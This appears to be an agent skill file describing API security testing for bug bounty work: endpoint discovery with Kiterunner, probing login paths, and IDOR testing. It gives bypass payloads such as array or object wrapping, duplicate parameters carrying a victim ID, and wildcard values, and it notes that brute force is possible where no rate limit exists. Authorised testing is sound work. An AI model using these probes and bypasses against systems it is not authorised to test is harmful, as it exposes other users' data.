---
name: api-fuzzing-for-bug-bounty
description: Use this skill when you need to test API security, fuzz APIs, find IDOR vulnerabilities, or conduct API penetration testing during bug bounty engagements.
---

# Skill body

## Purpose

Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.

## Inputs/Prerequisites

- Burp Suite or similar proxy tool
- API wordlists (SecLists, api_wordlist)
- Understanding of REST/GraphQL/SOAP protocols
- Python for scripting
- Target API endpoints and documentation (if available)

## Outputs/Deliverables

- Identified API vulnerabilities
- IDOR exploitation proofs
- Authentication bypass techniques
- SQL injection points
- Unauthorized data access documentation

## API Types Overview

| Type   | Protocol | Data Format         | Structure         |
|--------|----------|---------------------|--------------------|
| SOAP   | HTTP     | XML                 | Header + Body      |
| REST   | HTTP     | JSON/XML/URL        | Defined endpoints   |
| GraphQL| HTTP     | Custom Query        | Single endpoint     |

## Core Workflow

### Step 1: API Reconnaissance

Identify API type and enumerate endpoints:

```bash
# Check for Swagger/OpenAPI documentation
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# Use Kiterunner for API discovery
kr scan https://target.com -w routes-large.kite

# Extract paths from Swagger
python3 json2paths.py swagger.json
```

### Step 2: Authentication Testing

```bash
# Test different login paths
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# Check rate limiting on auth endpoints
# If no rate limit → brute force possible

# Test mobile vs web API separately
# Don't assume same security controls
```

### Step 3: IDOR Testing

Insecure Direct Object Reference is the most common API vulnerability:

```bash
# Basic IDOR
GET /api/users/1234 → GET /api/users/1235

# Even if ID is email-based, try numeric
/?user_id=111 instead of /?user_id=user@mail.com

# Test /me/orders vs /user/654321/orders
```

**IDOR Bypass Techniques:**

```bash
# Wrap ID in array
{"id":111} → {"id":[111]}

# JSON wrap
{"id":111} → {"id":{"id":111}}

# Send ID twice
URL?id=<LEGIT>&id=<VICTIM>

# Wildcard injection
{"user_id":"*"}
```